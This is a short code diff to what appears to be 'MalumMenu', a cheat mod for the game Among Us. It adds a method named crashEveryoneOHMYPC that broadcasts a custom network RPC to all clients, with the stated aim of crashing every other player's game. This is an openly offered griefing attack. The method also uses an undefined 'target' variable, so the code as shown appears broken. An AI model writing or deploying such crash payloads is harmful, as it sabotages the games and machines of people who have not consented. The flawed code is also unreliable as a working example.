@@ -1,5 +1,6 @@
 using Sentry.Internal.Extensions;
 using UnityEngine;
+using Hazel;
 
 namespace MalumMenu;
 public static class MalumCheats
@@ -314,4 +315,16 @@ public static class MalumCheats
         catch{}
     }
 
+	public static void crashEveryoneOHMYPC()
+	{
+		// (Host) Send custom RPC to ALL clients to something that the server doesn't respond to
+        MessageWriter writer = AmongUsClient.Instance.StartRpcImmediately(
+            target.NetId,
+            250,  // 250
+            SendOption.Reliable,
+            -1 // Broadcast to everyone
+        );
+        writer.Write(target.PlayerId);
+        AmongUsClient.Instance.FinishRpcImmediately(writer);
+	}
 }
